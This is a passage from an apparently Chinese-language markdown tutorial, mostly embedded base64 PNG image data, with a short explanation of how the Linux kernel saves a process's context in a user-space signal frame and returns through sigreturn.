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pGpmGdvZYv0ivryO5tfKd0TFzua4RaNWqZ3gXDuyvY2UwmAiKw9AT0IsulZ6eYIlDlCPByvB6bdE09+tPnfGOd1upo9/YblhpL6zRb06eM7J7uiYZM3y59/B/2xmlNBo10pkQcunVxY5xFwLz0sZ9vX0rDiekihGHb0tN3PS5N88peKPyhT39ptWoLO3DLXhlmNNDpNWVNy47rb5vc6S3t5Vu5ruTCavrsb9KakCM6H5AW5bZp0sp6duyeRi7oEaWRz5QQ3kOxqzdGEGS8j+aIbXund1lERjTUNm+zib/zYkZa3E/DhbU9B27ZMzWmEDyIneP8/RZM5ynLuC9e8sc8/5Xq1EsC5LqDLrXG9VdNc+q3dI4IPF5Ud2Tng9IWuLx/hhd1HuwNLhZbY+u1aJternfG7gN+k0033/hgMxdXNKbmulDkpX8H+DbPbA29sHVEv0lEDnlFgK2QGYxDiLIdOA39TUrWa7FAPV64yqYXO/ozmEYDvQNgrSZt0rPP+1JiyhjTuXjOmFL2vffir+/P0kFen+7r92efItk2c99s+EDd2sNH9bJH+XiZK6MOB221d2Z6FyOBrDVhBJa0eZ8L5avjL7zs7X7rNF0riQJeDru1jzqyHfDFPU9Loyn3jPu7bdZm45x1JdQRfkN4CSUvkey0ZsdUR3i2qVu8LJL7GbDTEbbT+p0XOkLLJiLtPG/uuSyjDrO2hN8nOlWY9tbH72vEMTemzpV2Pg1srdVapxGV6bNnps0ABh9wYc5alFQmr2OMuvC7Q0cJHQ11atVO62s28c4KNh5hpIg1LnREjOh/o7XxjoswfqPwR6DRAVLamvjvw/7+DKSX8fpvJGvZ+K25cr/z7MjtDiwdXNciIALlIKAXWZYDloKKgAiIgAiIgAiIgAiIgAhULgGtgalc/spdBERABERABERABERABESgHAQkYMoBS0FFQAREQAREQAREQAREQAQql4AETOXyV+4iIAIiIAIiIAIiIAIiIALlICABUw5YCioCIiACIiACIiACIiACIlC5BCRgKpe/chcBERABERABERABERABESgHAQmYcsBSUBEQAREQAREQAREQAREQgcolIAFTufyVuwiIgAiIgAiIgAiIgAiIQDkISMCUA5aCioAIiIAIiIAIiIAIiIAIVC4BCZjK5a/cRUAEREAEREAEREAEREAEykFAAqYcsBRUBERABERABERABERABESgcglIwFQuf+UuAiIgAiIgAiIgAiIgAiJQDgISMOWApaAiIAIiIAIiIAIiIAIiIAKVS0ACpnL5K3cREAEREAEREAEREAEREIFyEJCAKQcsBRUBERABERABERABERABEahcAhIwlctfuYuACIiACIiACIiACIiACJSDwP8DFl4U7KLrdJ4AAAAASUVORK5CYIINCg==)\n\n1. 内核向某个进程发送signal机制，该进程会被暂时挂起，进入内核态。\n2. 内核会为该进程保存相应的上下文，**主要是将所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址**。此时栈的结构如下图所示，我们称ucontext以及siginfo这一段为Signal     Frame。**需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的signal handler中处理相应的signal。因此，当signal handler执行完之后，就会执行sigreturn代码。\n\n![signal2-stack](data:image/png;base64,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